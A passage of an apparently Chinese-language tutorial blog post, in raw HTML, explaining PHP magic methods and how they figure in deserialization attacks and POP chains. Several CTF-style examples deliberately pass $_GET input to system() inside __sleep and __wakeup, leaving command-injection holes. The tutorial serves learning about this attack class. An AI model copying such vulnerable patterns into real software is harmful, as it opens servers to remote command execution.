class="keyword">echo</span> <span class="string">&quot;Dog <span class="subst">$this</span>-&gt;name is destroyed.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;luck&quot;</span>); </span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>); <span class="comment">//触发一次 - 显式销毁 反序列化之后没有直接使用</span></span><br><span class="line"><span class="comment">// 结束后再次触发 - 隐式销毁</span></span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dog  is destroyed.</span><br><span class="line">Dog  is destroyed.</span><br></pre></td></tr></table></figure><h2 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h2><p>在序列化serialize的时候会检查是否存在当前魔术方法<code>__sleep()</code>，如果存在，该方法会先被调用，然后才执行序列化操作。此功能主要是用来清理对象，并且返回一个包含对象中所有应被序列化的变量名称的数组，如果他没有返回任何内容，则NULL被序列化并且会产生一个<code>E_NOTICE</code>级别的错误。下面看个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>他的返回值如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>不要看他又很多的成员，但是他只会序列化sleep返回的成员名。<br>下面看一道简单的例题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$cmd</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>benben直接传入命令即可</p><h2 id="weakup"><a href="#weakup" class="headerlink" title="__weakup"></a>__weakup</h2><p>在反序列化的时候<code>unserialize()</code>会检查是否存在一个<code>__wakeup()</code>的方法，如果存在则会先调用他，预先准备对象需要的资源。预先准备对象资源，返回void，常用于反序列化操作中的重新建立数据库连接，或者执行其他初始化内容。他非常重要，因为每次反序列化的时候都会优先触发，很多场景都是由她作为攻击的入口，还有一些特殊情况会通过这个函数给一些默认值，需要绕过，看下面简单代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>返回内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span>(User)<span class="comment">#1 (4) &#123; [&quot;username&quot;]=&gt; string(1) &quot;a&quot; [&quot;nickname&quot;]=&gt; string(1) &quot;b&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(1) &quot;a&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL &#125;</span></span><br></pre></td></tr></table></figure><p>简单再去看一道例题，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user_ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里只需要传入username的数据即可，并且直接传入命令就行。</p><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h2><p>当实例化后的一个类被当作字符串去使用的时候就会触发，下面看一个示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="string">&#x27;格式不对，输出不了!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里直接输出了实例化之后的<code>User</code>，他最终输出的内容是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User <span class="title function_ invoke__">Object</span> ( [benben] =&gt; this is test!! )</span><br><span class="line">格式不对，输出不了!</span><br></pre></td></tr></table></figure><p>他比较重要常用于构造pop链。</p><h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h2><p>当实例化后的一个类被当作函数去使用的时候就会触发，下面看一个示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$benben</span> = <span class="string">&quot;this is test!!&quot;</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">         </span>&#123;</span><br><span class="line">             <span class="keyword">echo</span>  <span class="string">&#x27;它不是个函数!&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span> -&gt;benben;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>() -&gt;benben;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>返回内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">this is test!!</span><br><span class="line">它不是个函数!</span><br></pre></td></tr></table></figure><p>这里是直接调用里面的benben这个成员变量当作一个函数去执行，他就触发了invoke。他比较重要常用于构造pop链。</p><h2 id="错误调用相关的魔术方法"><a href="#错误调用相关的魔术方法" class="headerlink" title="错误调用相关的魔术方法"></a>错误调用相关的魔术方法</h2><p>简单汇总一下，当错误调用一个不存在的方法的时候就会调用，传入的参数是两个，分别是调用的函数名字还有传入的参数，常见的可以参考下面代码</p><h3 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt; <span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>里面没有任何成员方法的，这里如果直接去调用则会输出下面内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callxxx,a</span><br></pre></td></tr></table></figure><h3 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic"></a>__callStatic</h3><p>静态调用或者调用成员常量时候使用的方法不存在就会触发，传入的参数是两个，分别是调用的函数名字还有传入的参数，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>他和<code>__call</code>意思差不多，只不过调用的方法是静态的主要区别就是<code>::</code></p><h3 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h3><p>调用成员属性不存在的时候就会触发get，传入的参数就是被访问的不存在成员名，示例代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本身没有成员方法var2，此时输出如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2</span><br></pre></td></tr></table></figure><h3 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h3><p>当给一个不存在的成员变量赋值的时候就会调用他，他传入的参数是被设置的成员名字和设置的数据，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span> ,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$arg2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$test</span> -&gt;var2=<span class="number">1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var2,<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p>当对不可访问的属性使用isset()或者empty()的时候，当前魔术方法就会被调用,传入的参数是一个当前使用的成员属性名称，示例代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span></span><br></pre></td></tr></table></figure><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><p>当对不可访问的属性使用<code>unset()</code>的时候触发，传参是当前使用的成员变量名字，代码案例如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="variable">$arg1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>返回值如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span></span><br></pre></td></tr></table></figure><h3 id="clone"><a href="#clone" class="headerlink" title="__clone"></a>__clone</h3><p>当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义当前魔术方法，无传值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"> </span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>() ;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__clone test</span><br></pre></td></tr></table></figure><h1 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h1><h2 id="前置例题1"><a href="#前置例题1" class="headerlink" title="前置例题1"></a>前置例题1</h2><p>学习了魔术方法，我们可以简单看一道题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span 